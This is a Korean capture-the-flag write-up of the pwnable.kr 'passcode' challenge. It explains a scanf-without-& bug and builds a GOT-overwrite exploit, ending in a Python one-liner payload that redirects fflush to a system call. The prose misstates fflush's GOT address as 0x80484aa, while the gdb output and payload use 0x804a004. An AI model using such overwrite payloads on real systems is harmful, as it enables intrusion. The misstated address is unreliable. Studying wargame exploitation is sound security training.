# 문제
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)

---
# 개요
서버에 접속하여 ls 명령을 입력해보면 passcode, passcode.c, flag 3개의 파일이 존재하는 것을 알 수 있습니다. cat 명령어를 통해 passcode.c 파일을 확인합니다.

```c
#include <stdio.h>  
#include <stdlib.h>  

void login(){  
    int passcode1;  
    int passcode2;  

    printf("enter passcode1 : ");  
    scanf("%d", passcode1);  
    fflush(stdin);  

    printf("enter passcode2 : ");  
    scanf("%d", passcode2);  

    printf("checking...\n");  
    if(passcode1==338150 && passcode2==13371337){  
                printf("Login OK!\n");  
                system("/bin/cat flag");  
        }  
        else{  
                printf("Login Failed!\n");  
        exit(0);  
        }  
}  

void welcome(){  
    char name[100];  
    printf("enter you name : ");  
    scanf("%100s", name);  
    printf("Welcome %s!\n", name);  
}  

int main(){  
    printf("Toddler's Secure Login System 1.0 beta.\n");  

    welcome();  
    login();  

    // something after login...  
    printf("Now I can safely trust you that you have credential :)\n");  
    return 0;     
}  
```
main함수에서 welcome() → login() 순으로 실행됩니다. welcome() 함수에서 100byte를 입력받고 그 값을 출력합니다. login() 함수에는 2개의 입력을 받아 출력한는데 scanf() 함수에 & 연산자가 누락된 것을 알 수 있습니다. &연산자가 없으면 scanf함수는 받은 인자를 주소로 인식합니다. 이를 이용하여 변수 값을 주소 삼아 쓰는 것이 가능합니다. 그리고 fflush(stdin) 명령을 통해 입력 버퍼를 비웁니다.

여기서 우리가 주목해야 할 코드는 다음과 같습니다.
```c
printf("enter passcode1 : ");  
scanf("%d", passcode1);  
fflush(stdin);  

printf("enter passcode2 : ");  
scanf("%d", passcode2);
```
이 둘의 입력 값을 passcode 라는 변수에 저장하는 것이 아닌 passcode 를 주소로 하는 곳에 저장을 하게됩니다. 예를들어 passcode가 0x12341234 라면 0x12341234에 우리가 입력한 값이 저장되는 것입니다. 두 변수 모두 초기화 되지 않았으므로 더미 값이 들어가 있을 것이고 그 더미 값을 주소로 하는 곳에 입력 값을 저장하게되기 때문에 오류가 발생합니다.
# 분석
gdb를 이용하여 바이너리를 분석해봅시다.  
```
0x0804862f <+38>:	lea    edx,[ebp-0x70]
0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx
0x08048636 <+45>:	mov    DWORD PTR [esp],eax
0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
```
welcome() 함수에서 ebp-0x70에 입력 값을 저장합니다.
```
0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx
0x08048583 <+31>:	mov    DWORD PTR [esp],eax
0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
```
epb-0x10이 passcode1 의 위치임을 알 수 있습니다.  

welcome()함수에서 100byte 만큼의 입력을 받는데 [ebp-0x70] - [ebp-0x10] = 0x60 = 96byte이므로 passcode1의 값에 대한 조작이 가능합니다. 그리고 passcode의 값을 주소로 하는 곳에 원하는 아무 값을 넣을 수 있으므로 원하는 주소에 원하는 값을 넣을 수 있게 됩니다.  

이제 fflush(stdin)을 우회해야 합니다. 조작할 수 있는 4byte를 사용하여 fflush의 got 를 login의 system 함수로 바꾸면 system("/bin/cat/flag") 가 실행될 것입니다.
```
(gdb) i func
All defined functions:

Non-debugging symbols:
0x080483e0  _init
0x08048420  printf@plt
0x08048430  fflush@plt
0x08048440  __stack_chk_fail@plt
0x08048450  puts@plt
0x08048460  system@plt
0x08048470  __gmon_start__@plt
0x08048480  exit@plt
0x08048490  __libc_start_main@plt
0x080484a0  __isoc99_scanf@plt
0x080484b0  _start
0x080484e0  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048564  login
0x08048609  welcome
0x08048665  main
0x080486a0  __libc_csu_init
0x08048710  __libc_csu_fini
0x08048712  __i686.get_pc_thunk.bx
0x08048720  __do_global_ctors_aux
0x0804874c  _fini
(gdb) x/i 0x8048430
   0x8048430 <fflush@plt>:	jmp    DWORD PTR ds:0x804a004
(gdb)
```
fflush의 got 주소는 0x80484aa 입니다.
```
0x080485de <+122>:	call   0x8048450 <puts@plt>
0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
0x080485ea <+134>:	call   0x8048460 <system@plt>
```
login 함수에서 system 함수의 시작부분은 0x80485e3입니다.  
이를 이용하여 공격코드를 제작합니다.
```
passcode@ubuntu:~$ (python -c 'print "A" * 96 + "\x04\xa0\x04\x08" + "134514147"';cat) | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAA! 
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```
